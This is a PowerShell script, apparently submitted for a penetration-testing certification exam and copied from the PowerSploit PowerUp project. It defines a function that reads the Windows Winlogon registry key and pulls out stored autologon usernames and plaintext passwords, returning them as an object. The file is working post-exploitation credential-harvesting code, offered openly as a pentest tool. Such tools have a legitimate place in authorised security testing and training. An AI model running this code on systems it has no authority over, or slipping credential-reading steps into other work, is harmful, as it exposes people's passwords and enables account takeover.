#the code was written by @HarmJ0y in powerUp project and been copied from powersploit repo https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

function Invoke-regisrty-scraper {
<#

.SYNOPSIS
Finds autologon credentials left in the registry.

.DESCRIPTION

Checks if any autologon accounts/credentials are set in a number of registry locations.
If they are, the credentials are extracted and returned as a custom PSObject.
     
.EXAMPLE

PS C:\> Invoke-regisrty-scraper


.LINK
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb



.NOTES

Student ID : NONE
This blog post has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam: http://www.securitytube-training.com/onlinecourses/powershell-for-pentesters/
the code was written by @HarmJ0y in powerUp project and been copied from powersploit repo https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

#> 







    #the code was written by @HarmJ0y in powerUp project and been copied from powersploit repo https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
    [CmdletBinding()] param()

    # We get the value data of the entries in "AutoAdminLogon"
    $AutoAdminLogon = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    # Check for the Value in AutoAdminLogon 
    if (($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0))){

        # Get the DefaultUserName Value data
        $DefaultUserName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName

        # Get the DefaultPassword Value data
        $DefaultPassword = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword

        # in case there is value data for DefaultUserName print it  
        if ($DefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $out
        }

        
     
    }
        
}
